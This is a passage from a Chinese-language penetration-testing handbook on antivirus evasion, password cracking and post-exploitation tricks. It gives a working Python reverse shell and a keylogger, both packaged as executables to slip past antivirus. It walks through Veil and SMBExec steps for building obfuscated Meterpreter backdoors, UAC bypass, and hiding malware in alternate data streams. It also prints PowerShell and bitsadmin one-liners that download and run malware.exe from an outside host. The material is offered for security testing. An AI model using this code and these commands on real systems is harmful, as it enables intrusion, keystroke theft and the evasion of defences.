  \n![](img/00212.jpeg)\n\n**图 131 - 成功绕过杀毒软件扫描**\n\n扫描后，杀毒软件不再检测到该文件，且应用程序仍能完美运行。值得注意的是，这之所以奏效，是因为我们修改的值不影响可执行文件的执行。如果特征码基于无法修改的代码，我们就无法使用此技巧。我只是想演示杀毒软件的一些弱点以及绕过它们的概念性方法。\n\
  \n![](img/00213.jpeg)\n\n### Python 是你的最佳伙伴\n\n我用 Python 创建大多数漏洞利用代码和工具。Python 效果极佳，原因有几点。首先，应用程序白名单通常允许运行\
  \ Python 文件。其次，你可以很容易地添加随机性以绕过任何特征码。第三，使用 `py2exe` 等工具可将脚本转换为独立可执行文件。\n\n#### Python\
  \ Shell\n\n看了 Dave Kennedy 2012 年在 BSides 的演讲 ([`www.trustedsec.com/files/BSIDESLV_Secret_Pentesting_Techniques.pdf`](http://www.trustedsec.com/files/BSIDESLV_Secret_Pentesting_Techniques.pdf))\
  \ 后，我开始走上用 Python 创建恶意载荷的道路。最简单的例子是创建一个 Python Shell 并用 `py2exe` 打包。\n\n```python\n\
  #!/usr/bin/python\n\nimport socket, subprocess\n\nHOST = '192.168.10.100'\nPORT\
  \ = 5151\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST,\
  \ PORT))\ns.send('[*] Connection Established!')\n\nwhile 1:\n    data = s.recv(1024)\n\
  \    if data == 'quit': break\n    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,\
  \ stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n    stdout_value = proc.stdout.read()\
  \ + proc.stderr.read()\n    s.send(stdout_value)\n\ns.close()\n```\n\n这段代码执行时，会向\
  \ `192.168.10.100` 反弹一个 Shell，我在该主机上用 netcat 监听 5151 端口。这个反向 Shell 将给我提供目标主机的命令行访问权限。使用\
  \ `pyinstaller`，我们可以将 Python 文件转换为可执行文件。\n\n```\nC:\\python27\\python.exe C:\\utils\\\
  pyinstaller-2.0\\pyinstaller.py --out=C:\\shell\\ --noconsole --onefile C:\\shell\\\
  shell.py\n```\n\n同样，如果你尝试用杀毒软件扫描该文件，它不会被检测到。\n\n#### Python 键盘记录器[²⁹]\n\n每个人使用不同类型的键盘记录器，我的目标是开发一种最可能被白名单应用程序列表接受且能在杀毒软件下隐蔽运行的工具。\n\
  \n下面是让 Python 开始记录所有按键的简单代码。\n\n```python\nimport pyHook, pythoncom, sys, logging\n\
  \nfile_log = 'C:\\\\systemlog.txt'\n\ndef OnKeyboardEvent(event):\n    logging.basicConfig(filename=file_log,\
  \ level=logging.DEBUG, format='%(message)s')\n    chr(event.Ascii)\n    logging.log(10,\
  \ chr(event.Ascii))\n    return True\n\nhooks_manager = pyHook.HookManager()\nhooks_manager.KeyDown\
  \ = OnKeyboardEvent\nhooks_manager.HookKeyboard()\npythoncom.PumpMessages()\n```\n\
  \n这是我的 `setup.py` 文件：\n\n```python\nfrom distutils.core import setup\nimport py2exe\n\
  \nsetup(options = {'py2exe': {'bundle_files': 1, 'compressed': True}},\n      windows\
  \ = [{'script': \"logger.py\"}],\n      zipfile = None,\n)\n```\n\n使用 `py2exe`，我将通过以下命令把\
  \ Python 脚本转换为可执行文件：\n\n```\npython.exe setup.py install\npython.exe setup.py py2exe\n\
  ```\n\n现在我得到了一个键盘记录器的可执行二进制文件，它记录所有按键并将日志存储到 `C:\\systemlog.txt`。非常简单易行，且杀毒软件从未检测到它。如果需要，你可以添加一些随机性以确保不被特征码或哈希匹配检测到。\n\
  \n### Veil 示例 (Kali Linux)\n\n\n\n\n## Veil Payload Generator\n\nVeil 是由 Christopher\
  \ Truncer 创建的用于绕过杀毒软件的 Payload 生成器。该工具使用多种不同的方法来规避 AV，但最著名的是将 Meterpreter shell\
  \ 转换为 Python，并将其封装在 `py2exe`/`pyinstaller` 中。这样生成的可执行文件可以绕过许多白名单工具和 AV。这是因为 Python\
  \ 通常是被批准的白名单应用程序，并且可以轻松编码以绕过 AV。使用 Veil 的方法有很多种，但我将介绍最通用的一种。\n\n### 创建混淆的反向 Meterpreter\
  \ 可执行文件：\n\n1.  `cd /opt/Veil`\n2.  `./Veil.py`\n3.  选择 MeterHTTPSContained payload：\n\
  \    *   `use 20`\n4.  与 Metasploit 一样，我们接下来需要设置 `LHOST` 和 `LPORT`。在本例中，我的攻击者系统是\
  \ `192.168.75.131`，`LPORT` 将是 `443`（以模仿 SSL）。\n    *   `set LHOST 192.168.75.131`\n\
  \    *   `set LPORT 443`\n5.  `generate`\n\n![Figure 132 - Configuring Veil](img/00214.jpeg)\n\
  \n如前所述，我们希望将 payload 封装在 Python 中以帮助规避检测。我们可以通过配置以下命令来完成此操作：\n\n1.  选择 Pyinstaller\n\
  \    *   `1`\n\n![Figure 133 - Using Python to Compile Reverse HTTPS Meterpreter](img/00215.jpeg)\n\
  \n可执行文件将位于 `/root/veil-output/compiled/` 文件夹中。不要将此文件上传到 Virus Total 这类网站，因为这可能会在你的行动开始前就向\
  \ AV 预警，但你应该使用本地的 AV 实例进行验证，以确保它们不会触发任何特征码。这种方法目前尚未让我失手，应该成为你武器库的一部分。\n\n## SMBExec\
  \ (Kali Linux)\n\nSMBExec 是由 brav0hax 开发的工具（[`github.com/brav0hax/smbexec`](https://github.com/brav0hax/smbexec)），包含许多不同的功能。在本书中，我们曾用该工具从域控制器提取哈希值，但它也可用于枚举共享、验证登录、禁用\
  \ UAC，以及创建混淆的 Meterpreter 可执行文件。Brav0hax 利用多种不同的混淆技术，包括随机化和使用原生 C 语言编译以绕过 AV（请阅读\
  \ `smbexec.sh` 的源代码）。这就是我们将用来创建反向 shell 的方法。\n\n### 创建混淆的反向 Meterpreter 可执行文件：\n\
  \n1.  `cd /opt/smbexec`\n2.  `./smbexec.sh`\n3.  使用以下命令选择 System Access：\n    *\
  \   `2`\n4.  选择 Create an executable and rc script\n    *   `2`\n5.  选择 `windows/meterpreter/reverse_https`\n\
  \    *   `2`\n6.  输入你的本地主机和端口\n    *   `172.16.139.209`\n    *   `443`\n\nSMBExec\
  \ 完成并退出应用程序后，会在同一目录下创建一个新文件夹。该文件夹遵循类似的时间戳命名格式。在该文件夹内，你将看到 `backdoor.exe`，这就是你的混淆反向\
  \ HTTPS Meterpreter 可执行文件。\n\n```\nroot@kali:/opt/smbexec/2013-12-23-1425-smbexec#\
  \ ls -alh\ntotal 128K\ndrwxr-xr-x 2 root root 4.0K Dec 29 18:28 .\ndrwxr-xr-x 10\
  \ root root 4.0K Dec 23 14:44 ..\n-rwxr-xr-x 1 root root 110K Dec 23 14:28 backdoor.exe\n\
  -rw-r--r-- 1 root root 283 Dec 23 14:28 metasetup.rc\n-rw-r--r-- 1 root root 92\
  \ Dec 23 14:28 sha1-backdoor.hash\n```\n\n在同一文件夹中，你还将看到 `metasetup.rc` 脚本。RC 脚本将在本书后面讨论，但如果你查看该文件，会看到类似于下面的代码：\n\
  \n```\nspool /opt/smbexec/2013-12-23-1425-smbexec/msfoutput-1425.txt\nuse exploit/multi/handler\n\
  set payload windows/meterpreter/reverse_https\nset LHOST 172.16.139.209\nset LPORT\
  \ 443\nset SessionCommunicationTimeout 600\nset ExitOnSession false\nset InitialAutoRunScript\
  \ migrate -f\nexploit -j -z\n```\n\n这是一个自动配置并运行你刚生成的 payload 的反向处理器的脚本。它还添加了设置超时和自动迁移\
  \ PID 等命令。运行 RC 脚本的命令如下：\n\n*   `msfconsole -r metasetup.rc`\n\n![Figure](img/00216.jpeg)\n\
  \n如果你正在对抗杀毒软件，这应该能让你很好地了解从何处入手。你最不希望看到的是 AV 阻止你攻破一个你可能已有漏洞利用代码的目标主机。虽然有许多不同的规避 AV\
  \ 技术，这并非详尽列表，但能让你了解如何着手。\n\n渗透测试的核心在于尝试不同的工具、技术和战术，以找到在特定环境中行之有效的方法。请记住，不要将你的可执行文件提交给\
  \ Virus Total 之类的仓库，因为这会大幅缩短你的可执行文件的生命周期。\n\n![Figure](img/00217.jpeg)\n\n## 杂项渗透测试技巧\n\
  \n本节收集了其他有助于渗透测试但未在别处归类的内容。我将讨论一些关于破解密码哈希、搜索漏洞以及我使用的一些快捷方式的技巧和窍门。\n\n![Figure](img/00218.jpeg)\n\
  \n### 密码破解\n\n有许多不同的密码破解工具，我将重点介绍我使用的两个主要工具。这两个工具是 John the Ripper (JtR) 和 oclHashcat。它们都是优秀的密码破解工具。\n\
  \n在讨论不同的密码破解器之前，重要的是要确保你理解基本定义。为了实现高效的密码破解过程，通常需要配置的三个要素是定义字典、规则和哈希算法。\n\n#### 字典\n\
  \n这正如其名。它们是包含明文密码列表的文件。密码破解软件会尝试对这些密码中的每一个进行哈希运算，并查看是否与你试图破解的哈希值匹配。\n\n我通常喜欢从之前的密码泄露事件中获取字典，并结合你正在对付的组织类型进行整合。例如，如果你要从域控制器破解\
  \ NTLM 哈希，请确保了解他们的密码策略。如果他们要求最少 8 个字符，尝试 4 或 5 位的密码就毫无意义。\n\n以下是我最喜欢的一些字典：\n\n**列表名称：**\
  \ RockYou\n**详情：** 2009 年来自一个社交游戏和广告网站的泄露。这是一个很好的入门列表，因为它体积不太大，且包含大量常见密码，成功率不错。\n\
  **下载链接：** `http://downloads.skullsecurity.org/passwords/rock-you.txt.bz2`\n\n**列表名称：**\
  \ Crackstation-human-only\n**详情：** 从各种网站数据库泄露的真实人类密码。该列表中约有 6400 万个密码。\n**下载链接：**\
  \ `http://bit.ly/1cRS62E`\n\n**列表名称：** m3g9tr0n_Passwords_WordList_CLEANED^[30]\n\
  **详情：** 包含 1.22 亿个密码的列表\n**下载链接：** `http://bit.ly/KrTcHF`\n\n#### 规则\n\n规则定义是否需要向字典中注入任何修改。描述规则最好的方式是通过一个易于理解的示例。我们可以使用\
  \ KoreLogicRulesAppendYears^[31] 规则集，其内容如下：\n\n```\ncAz”19[0-9][0-9]”\nAz”19[0-9][0-9]”\n\
  cAz”20[01][0-9]”\nAz”20[01][0-9]”\n```\n\n它会将 1949 年到 2019 年的年份追加到每个密码后面。因此，如果密码列表中包含单词\
  \ \"hacker\"，它将尝试破解从 `hacker1949` 一直到 `hacker2019` 的哈希值。请记住，规则越复杂，遍历字典中所有单词所需的时间就越长。\n\
  \n#### 哈希算法\n\n哈希算法用于生成密码哈希。这些非常重要，因为如果你选择了错误的算法，要么无法运行，要么无法破解。例如，如果我们为 SHA1 哈希选择\
  \ MD5 算法，破解工具将找不到任何可破解的哈希值并立即退出。\n\n现在我们已经基本了解了不同的破解配置，让我们来对比一下 John the Ripper\
  \ 和 oclHashcat。\n\n![Figure](img/00219.jpeg)\n\n\n\n\n我过去经常使用 JtR，但由于 oclHashcat\
  \ 的 GPU 支持，我已经有一段时间没用了。不过 JtR Jumbo 现在确实支持 CUDA 和 OpenCL。以下是 JtR 哈希格式列表，可帮助您识别正在破解的类型：[`pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats`](http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)。\n\
  \n### 破解 MD5 哈希\n\n假设您能够攻破一台 \\*nix 系统，或者可能是一个装满密码哈希的数据库。您最有可能遇到 MD5 或 SHA 哈希，但在以下示例中，我们假设它们是非加盐的\
  \ MD5 哈希。如果您想破解标准 MD5 哈希，基本命令是：\n\n*   `john -format=raw-md5 -pot=./list.pot md5list.txt`\n\
  \n这将告诉 John the Ripper 在 `md5list.txt` 文件中查找 MD5 哈希，并将破解出的密码写入 `list.pot` 文件。\n\n\
  ```\nroot@kali:~# john —format=raw-md5 —pot=./list.pot md5list.txt\n\nLoaded 3 password\
  \ hashes with no different salts (Raw MD5 [128/128 SSE2])\n\ntest (test)\n\npassword\
  \ (user)\n\nwoot (hacker)\n\nguesses: 3 time: 0:00:00:01 DONE (Sun Dec 29 18:32:12\
  \ 2013)\n```\n\n如果您使用的是 JtR Jumbo 包并想利用 GPU 处理：\n\n```\njohn —format=raw-md5-opencl\
  \ —wordlist=./Wordlists/all.lst —rules: Single md5list.txt\n```\n\n以下是关于使用 JtR 的其他资源：[`blog.thireus.com/cracking-story-how-i-cracked-over-122-million-sha1-and-md5-hashed-passwords`](http://blog.thireus.com/cracking-story-how-i-cracked-over-122-million-sha1-and-md5-hashed-passwords)。\n\
  \n![](img/00220.jpeg)\n\n老实说，这是我破解密码时最常用的工具。众所周知，图形处理单元（GPU）非常适合破解密码，因为它们利用许多不同的内核并行工作。使用\
  \ GPU 与 CPU 相比优势显著，这可以通过 oclHashcat 的使用来证明。\n\n在以下示例中，我将介绍破解 WPAv2 和 NTLMv2。这些是我遇到的最常见的哈希类型，实际上也是任何其他类型哈希的基础。如果您想查看\
  \ oclHashcat 支持的所有不同哈希类型，请访问他们的网站：[`hashcat.net/oclhashcat/`](http://hashcat.net/oclhashcat/)。\n\
  \n### 破解 WPAv2\n\n在本书开头，我讨论了如何捕获破解密码所需的 WPAv2 握手包。捕获的输出是一个 `.hccap` 文件。这是 oclHashcat\
  \ 支持的用于暴力破解 WPA 哈希密码的文件格式。\n\n在以下示例中，我将在我的 Windows 主机上使用配备 GeForce GTX 680 的 oclHashcat。虽然我确实更喜欢使用\
  \ ATI Radeon 显卡，但实际上对于这个示例来说，区别不大。要开始破解密码，我将使用以下命令：\n\n*   `cudaHashcat-plus64.exe\
  \ -m 2500 out.hccap list\\\\rockyou.txt`\n\n![](img/00221.jpeg)\n\n**图 134 - oclHashcat\
  \ 示例**\n\n这是一个非常直接的示例，意思是针对 `out.hccap` 文件破解 WPAv2 哈希，并使用来自 `rockyou.txt` 的密码列表。\n\
  \n### 破解 NTLMv2\n\n如果您攻破了一台 Windows 主机，或者可能是一个域控制器，您将不得不破解 NTLM 哈希。您可以随时尝试针对 LM\
  \ 哈希，但由于这越来越少见，我们将坚持使用 NTLM 哈希。\n\n在以下示例中，我们获取一个 NTLM 哈希列表，并使用 rockyou 密码列表。\n\n\
  ![](img/00222.jpeg)\n\n**图 135 - oclHashcat NTLM**\n\n从上面的示例中，有 3 个唯一密码，但 oclHashcat\
  \ 只能破解其中两个。为了增加机会，我将添加 passwordspro 规则集来配合 rockyou 密码列表。如果您想更深入地了解这些规则，请尝试从 oclHashcat\
  \ 页面开始：[`hashcat.net/wiki/doku.php?id=rule_based_attack`](http://hashcat.net/wiki/doku.php?id=rule_based_attack)。\n\
  \n![](img/00223.jpeg)\n\n**图 136 - 带规则的 oclHashcat**\n\n使用规则实际上并没有找到第 3 个哈希的密码。在更大的密码哈希列表中，这肯定会找到更多密码，但在这种情况下只能找到\
  \ 3 个密码中的 2 个。为了进一步增加机会，我将尝试一个大得多的密码列表。这当然会增加运行此作业所需的时间，但如果能解出一个密码，就值得。所以我将使用的命令是：\n\
  \n*   `cudaHashcat-plus64.exe -m 1000 NTLM.txt list\\\\realhuman.txt -r rules\\\\\
  passwordspro.rule`\n\n![](img/00224.jpeg)\n\n**图 137 - 使用不同密码列表的 oclHashcat**\n\n\
  正如您从结果中看到的，新的密码列表和规则集恢复了第 3 个密码。仅通过尝试不同的密码列表和规则集，您就可以快速发现什么有效，什么只是运行时间太长。这当然都基于您拥有什么类型的\
  \ GPU、密码列表有多长以及规则集的复杂程度。\n\n无论您想破解 MD5 哈希、MSSQL 哈希、SHA1 哈希还是其他哈希，都可以通过更改 `-m` 参数来运行相同的查询。有关\
  \ oclHashcat 接受和破解的哈希的完整列表，请访问 [`hashcat.net/wiki/doku.php?id=example_hashes`](http://hashcat.net/wiki/doku.php?id=example_hashes)。\n\
  \n### 更聪明地破解\n\n通常，我会使用配备 7990 GPU 的 oclHashcat，配合一个优秀的密码列表和规则集来破解哈希。这是因为我经常只是寻找弱密码作为概念验证，或者我只需要破解几个密码来进入\
  \ OWA 账户。有时客户会特别要求您尽可能多地破解哈希。\n\n有两个演示文稿我强烈建议您观看/研究。第一个称为“Cracking Corporate Passwords\
  \ - Exploiting Password Policy Weaknesses - Minga/Rick Redman”。\n\n[`www.irongeek.com/i.php?page=videos/derbycon3/1301-cracking-corporate-passwords-exploiting-password-policy-weaknesses-minga-rick-redman`](http://www.irongeek.com/i.php?page=videos/derbycon3/1301-cracking-corporate-passwords-exploiting-password-policy-weaknesses-minga-rick-redman)。该演示文稿深入探讨了\
  \ GPU 变得如此之快，以至于 8 位字符的密码可以在很短的时间内被暴力破解。然后它深入探讨了密码通常遵循基于密码策略的模式。如果密码策略规定您的密码需要一个特殊字符和一个数字，它通常遵循类似的模式。在大多数情况下，您会发现人们会把数字放在末尾，特殊字符放在末尾，通常是感叹号。如果需要大写字母，最有可能是第一个字母。\n\
  \n第二个演示文稿引用了 PACK（密码分析和破解工具包），这是一组实用程序，旨在帮助分析密码列表并通过智能规则生成增强密码破解。这是由我的一位好朋友制作的，您可以在此查看他的演示文稿：[`thesprawl.org/media/research/passwords13-smarter-password-cracking-with-pack.pdf`](http://thesprawl.org/media/research/passwords13-smarter-password-cracking-with-pack.pdf)\
  \ 和视频：[`www.youtube.com/watch?v=8j6fOAH-Sko`](http://www.youtube.com/watch?v=8j6fOAH-Sko)。\n\
  \n他在他的网站上也有关于如何使用他的工具以及如何以更聪明、更高效的方式破解密码的很好的描述和演练：[`thesprawl.org/projects/pack/`](http://thesprawl.org/projects/pack/)。\n\
  \n![](img/00225.jpeg)\n\n作为渗透测试员，很大一部分工作是能够发现应用程序和服务中的漏洞。从 Nmap 扫描、漏洞扫描以及四处探测中，您将识别出这些应用程序和服务的各种版本。\n\
  \n\n\n\n## 利用公开资源查找漏洞利用代码\n\n通常，我会获取 Nmap 服务版本探测和漏洞扫描器的结果，并针对识别出的应用程序版本，查询以下站点/工具以寻找漏洞利用代码：\n\
  \n![](img/00226.jpeg)\n\n### Searchsploit\n\n`Searchsploit` 是一个默认的查询工具，它会根据你提供的搜索字符串，在公开已知的漏洞利用代码库中进行搜索。你可以提供部分标题或应用名称来查找漏洞利用代码。这里有大量的漏洞利用代码，其中大多数都附带了可直接运行的代码或脚本。我要强烈建议的一件事是：**务必在实验室环境中测试它们，然后再在生产系统上测试。**\n\
  \n在你的 Kali 主机上，运行 `searchsploit`。\n\n![](img/00227.jpeg)\n\nFigure 138 - Searchsploit\n\
  \n以此为例，假设我发现了一个 Joomla 站点，我想查看该应用程序是否存在漏洞。要查询 `searchsploit`，我会构造如下查询：\n\n```bash\n\
  searchsploit joomla\n```\n\n![](img/00228.jpeg)\n\nFigure 139 - Searchsploit Results\n\
  \n仅从一个针对 Joomla 的快速查询，我们目前就有 906 个不同的漏洞。让我们查看其中一个，了解其结构。值得注意的是，结果中的路径是不正确的。所有 `searchsploit`\
  \ 文件都位于 `/usr/share/exploitdb/` 下。要查看漏洞或漏洞利用代码，请输入以下命令：\n\n```bash\ncat /usr/share/exploitdb/platforms/php/webapps/22153.pl\n\
  ```\n\n![](img/00229.jpeg)\n\nFigure 140 - 22153 Perl Joomla Exploit Example\n\n\
  `22153.pl` 是一个 Perl 脚本，用于对特定版本的 Joomla 执行 SQL 注入。如果成功，该 Perl 脚本将返回目标管理员的密码。\n\n\
  ![](img/00230.jpeg)\n\n### Security Focus BugTraq\n\nSecurity Focus 的 `BugTraq`\
  \ 是寻找漏洞和漏洞利用代码的绝佳来源。你可以通过 CVE 编号或按供应商/产品类型搜索漏洞，网址为：[`www.securityfocus.com/bid`](http://www.securityfocus.com/bid)。\n\
  \n在下面的示例中，我正在寻找一些 Adobe ColdFusion 的漏洞利用代码，看起来我找到了一大堆。\n\n![](img/00231.jpeg)\n\n\
  Figure 141 - BugTraq\n\n![](img/00232.jpeg)\n\n### Exploit-DB\n\n[`www.exploit-db.com/`](http://www.exploit-db.com/)\n\
  \n我真的把这个网站视为传奇站点 `milw0rm` 的替代者，而且这个网站确实已经壮大了。许多研究人员会将他们的漏洞利用代码和研究成果发布到 Exploit-DB，并且该网站支持全文搜索。我建议你花些时间在\
  \ Exploit-DB 上，因为它是一个极佳的资源。\n\n![](img/00233.jpeg)\n\nFigure 142 - Exploit-DB\n\n\
  ![](img/00234.jpeg)\n\n### Metasploit Framework\n\n你不能忘记 `Metasploit` 作为寻找漏洞的绝佳资源。\n\
  \n*   在你的 Kali 主机上，在终端中输入：`msfconsole`\n*   要查找漏洞利用模块或辅助模块，请输入：`search [what you\
  \ want to find]`\n\n在下面的示例中，我搜索所有 ColdFusion 模块。\n\n![](img/00235.jpeg)\n\nFigure\
  \ 143 - Search Metasploit\n\n![](img/00236.jpeg)\n\n## 实用技巧与脚本\n\n本节专门介绍那些没有固定归类、但能让你的工作更轻松的技巧。\n\
  \n![](img/00237.jpeg)\n\n### Metasploit 资源脚本\n\n既然我提倡效率，那么你应该研究一下 Metasploit 的资源脚本（RC\
  \ 脚本）。这些脚本可以被创建用于加速你可能执行的常见任务。在此示例中，我将创建一个脚本来使用 `PSExec` 模块，利用 `smart_migrate` 将\
  \ Meterpreter 进程迁移到另一个 PID，并设置攻击所需的所有其他填充信息。\n\n我们将以下代码保存到 `demo.rc`：\n\n*   `use\
  \ exploit/windows/smb/psexec`\n*   `set rhost 192.168.10.10`\n*   `set smbuser Administrator`\n\
  *   `set smbpass ____________hash____________ or password`\n*   `set smbdomain ______domain______`\n\
  *   `set payload windows/meterpreter/reverse_tcp`\n*   `set AutoRunScript post/windows/manage/smart_migrate`\n\
  *   `setg lport 443`\n*   `setg lhost 192.168.10.3`\n\n要运行该脚本，从 Shell 提示符下执行：\n\n\
  *   `msfconsole -r /root/demo.rc`\n\n![](img/00238.jpeg)\n\nFigure 144 - RC Scripts\n\
  \n脚本加载后，你只需输入：`exploit`。该脚本的作用是：启动 Metasploit，使用 PSExec 对 `192.168.10.10` 进行认证，投放并执行\
  \ Meterpreter Payload，并让目标主机反向连接回你的主机以获取一个完整的 Meterpreter Shell。\n\n这是一种准备脚本、漏洞利用代码，尤其是处理器（Handler）的更快方法。我喜欢添加自动迁移或向漏洞利用代码添加自定义\
  \ Payload 等功能。\n\n![](img/00239.jpeg)\n\n### 绕过 UAC\n\n有时你可能拥有一个管理员账户和一个 Meterpreter\
  \ 会话，但无法通过 `getsystem` 命令提权至 SYSTEM 权限。这很可能是因为用户账户控制（UAC）保护阻止了你运行 `getsystem` 命令。为了绕过此限制，David\
  \ Kennedy 在 Metasploit 中增加了绕过 UAC 的功能，做得非常出色。^(32)\n\n在下一个示例中，我假设你已经拥有一个 Meterpreter\
  \ 会话，并且是本地管理员。首先，你需要输入命令：\n\n*   `run bypassuac`\n\n这将导致另一个 Meterpreter 会话被创建。在本例中，它创建了会话\
  \ 2。我将把第一个会话放入后台，以免丢失该会话。这通过以下命令完成：\n\n*   `background`\n*   `session -i 2`\n\n\
  现在，如果你尝试 `getsystem` 模块，你将成为 SYSTEM 权限。\n\n![](img/00240.jpeg)\n\nFigure 145 - Bypassing\
  \ UAC\n\n![](img/00241.jpeg)\n\n### 利用 CNAME 绕过 Web 代理过滤\n\n偶尔我会遇到公司为所有互联网流量主动使用\
  \ Web 代理的情况。任何未分类的内容都会被阻止，我似乎无法让任何反向 Shell 绕过他们的过滤器。在这些罕见的情况下，你可以采取一些措施来提高成功率。对于我专门为测试购买的“同形异义域名”，我会在该域名上设置一个简单的\
  \ CNAME（规范名称）记录，指向我所伪装的原始域名。我会让它保留几天到几周，然后再开始测试。为什么？因为该站点会被许多不同的系统自动爬取，当爬虫看到配置为指向真实站点的\
  \ CNAME 时，它们会假设该域名是由该公司购买的，并将该域名归类为同一类已批准的域名。一旦测试开始，只需移除 CNAME 并配置实际恶意服务器的 IP 即可。\n\
  \n![](img/00242.jpeg)\n\n### 利用 FTP 脚本传输二进制文件\n\n这是一个由来已久的老技巧。你拥有对 Windows 主机的 Shell\
  \ 访问权限，但它不是交互式 Shell。如何将二进制文件传到 XP 主机上？一种方法是将 FTP 命令写入文件，并使用 `-s` 开关从文件读取命令并执行。如果你只有类似\
  \ Web PHP Shell 的东西而无法下载文件，这是一个很好的方法。我过去常用这种方法将 Meterpreter 可执行文件传到主机上，然后执行它以获得对主机的额外访问权限。\n\
  \n```cmd\ncmd /C \"echo open 192.168.100.100 > ftp.txt\"\ncmd /C \"echo hacker>>\
  \ ftp.txt\"\ncmd /C \"echo hacker>> ftp.txt\"\ncmd /C \"echo bin>> ftp.txt\"\ncmd\
  \ /C \"echo get nc.exe>> ftp.txt\"\ncmd /C \"echo bye>> ftp.txt\"\ncmd /C \"ftp\
  \ -s:ftp.txt\"\n```\n^(33)\n\n![](img/00243.jpeg)\n\n### 备用数据流\n\n如果你需要隐藏文件，备用数据流（ADS）总是一个不错的选择。ADS\
  \ 是一个非常古老的话题，但在 Windows 7 中略有变化。要快速解释 ADS：\n\n> 备用数据流（ADS）是 Windows NTFS 文件系统中鲜为人知的功能，它提供了将数据放入现有文件和文件夹中而不影响其功能和大小的能力。^(34)\n\
  \n这意味着你可以将文件隐藏在文件内部，且不易被 Windows 资源管理器甚至标准目录列表检测到。Windows 7 还引入了一些更改，阻止了 ADS 攻击。我们必须修改流程以允许将文件隐藏在其他文件中。\n\
  \n让我们演示如何创建和隐藏 ADS。\n\n\n\n\n\n### ADS 持久化与文件隐藏技术\n\n#### 创建虚拟文件\n首先，我们需要创建一个虚拟文件。在本例中，我们将把单词“hi”放入文档\
  \ `hi.txt` 中。\n\n```\necho “hi” > hi.txt\n```\n\n#### 在备用数据流 (ADS) 中隐藏恶意软件\n接下来，我们将把\
  \ `malware.exe` 文件隐藏到刚才创建的文本文件中。\n\n```\ntype C:\\Users\\Workshop\\Desktop\\malware.exe\
  \ > hi.txt:malware.exe\n```\n\n#### 验证 ADS 内容\n如果我们尝试读取 `hi.txt` 文件，只会读取到文件中的内容，而不会读取到恶意软件。\n\
  \n```\ntype hi.txt\n```\n\n#### 创建符号链接 (Windows 7+)\n同样，由于 Windows 7 进行了更改，普通的 ADS\
  \ 命令不再生效。我们需要创建一个指向该文件的符号链接。该符号链接文件将被称为 `malwareSymlink.exe`。\n\n```\nmklink malwareSymlink.exe\
  \ C:\\Users\\Workshop\\Desktop\\hi.txt:malware.exe\n```\n\n#### 隐藏符号链接\n因为符号链接会出现在所有的目录列表和\
  \ Windows 资源管理器中，我们需要在该文件上启用隐藏属性。这将使其在大多数普通用户设置中不可见。\n\n```\nattrib +h /L malwareSymlink.exe\n\
  ```\n\n如果我们查看目录列表，`malwareSymlink.exe` 将不存在，但如果我们执行该符号链接文件，恶意软件将会执行。\n\n![图 146\
  \ - 适用于 Windows 7 及更高版本的 ADS](img/00244.jpeg)\n\n有更好的方法来维持持久化，但 ADS 只是在可能被主动调查的系统上隐藏的另一种方式。\n\
  \n#### 使用 `\\?\\` 技巧隐藏文件\nMark Baggett 展示了一个很酷的技巧，可以通过使用 `\\\\?\\` 技巧来隐藏或锁定文件。最好通过一个示例来了解其工作原理及其用处。\n\
  \n##### 创建受限目录\n首先我们在 `C:\\tmp` 下创建一个文件夹。我们尝试创建名为 “..” 的文件夹，这在默认情况下 Windows 是不允许的。\n\
  \n```\nmkdir \\\\?\\c:\\tmp\\\"..\n```\n\n##### 将恶意软件移入目录\n接下来我们将恶意软件文件移入该目录。\n\n\
  ```\nmove malware.exe \"\\\\?\\c:\\tmp\\.. \\\n```\n\n如果我们进入 `tmp` 目录，可以看到一个名为 “..”\
  \ 的文件夹。如果在命令行中尝试进入文件夹 `..`，因为命令 `cd ..` 意味着返回上一级目录，我们将无法进入该目录。\n\n##### 检索恶意软件\n\
  我们始终可以使用以下命令从该目录中取出恶意软件：\n\n```\ncopy \"\\\\?c:\\tmp\\.. \\malware.exe\" .\n```\n\
  \n![图 147 - 隐藏文件](img/00246.jpeg)\n![图 148 - 隐藏文件](img/00247.jpeg)\n\n如果我们尝试从 Windows\
  \ 资源管理器中删除、修改或运行该可执行文件，由于文件的位置原因，我们会被拒绝访问。这是一个隐藏文件、备用数据流的绝佳位置，并能使分析师难以弄清你在做什么。\n\
  \n![图 149 - 访问被拒绝](img/00248.jpeg)\n\n### 文件传输方法 (Windows 7/8)\n在 Windows 7 和 8\
  \ 上，将文件传输到主机的更好方法是使用 `bitsadmin` 或 PowerShell。使用 `bitsadmin` 很棒，因为它用于 Windows 更新并使用\
  \ IE 代理设置。如果组织有需要 AD 凭据的 Web 代理，这是一种绕过它的方法。\n\n#### PowerShell\n(详情请查看“使用 PowerSploit\
  \ 进行后渗透”章节)\n\n```\ncmd.exe /c \"PowerShell (New-Object System.Net.WebClient).DownloadFile('http://www.securepla.net/malware.exe','malware.exe');(New-Object\
  \ -com Shell.Application).ShellExecute('malware.exe')\"\n```\n\n#### Bitsadmin\n\
  ```\ncmd.exe /c \"bitsadmin /transfer myjob /download /priority high http://www.securepla.net/malware.exe\
  \ c:\\malware.exe & start malware.exe\"\n```\n\n![图 150 - 文件传输命令](img/00249.jpeg)\n\
  \n## 报告最佳实践\n\n最终交付给客户的报告，才是客户真正关心的东西。在我在这本书中讨论的所有内容中，报告是渗透测试员获得报酬并被邀请再次测试的方式。这绝对是你测试中最重要的方面。你需要能够解释发现、对漏洞进行评级，并向客户解释结果在现实世界中的意义。\n\
  \n如果你曾经让多个渗透测试员评估过你的网络，你会发现报告会因执行测试的人员不同而有所差异。你会发现有些公司只是重新套用漏洞扫描器的报告模板，而另一些公司则提供详尽的报告并提供可复现的步骤。我发现真正缺乏价值的是：报告声称你有\
  \ 100 个 Apache/PHP 关键发现，但测试人员无法验证这些发现是基于漏洞本身真实存在，还是仅基于横幅版本判断的。\n\n既然报告实际上是你想要如何呈现发现的一种改编，我不会展示我的模板，而是给你一些我多年测试经验总结出的提示和最佳实践。\n\
  \n![报告概览](img/00250.jpeg)\n\n我过去教学时，会强调报告是成功渗透测试的最重要因素。无论你攻破了 3 台还是 300 台主机都无关紧要，如果你不准确地告诉客户你到底做了什么，或者不帮助客户理解解决这些问题的缓解措施。\n\
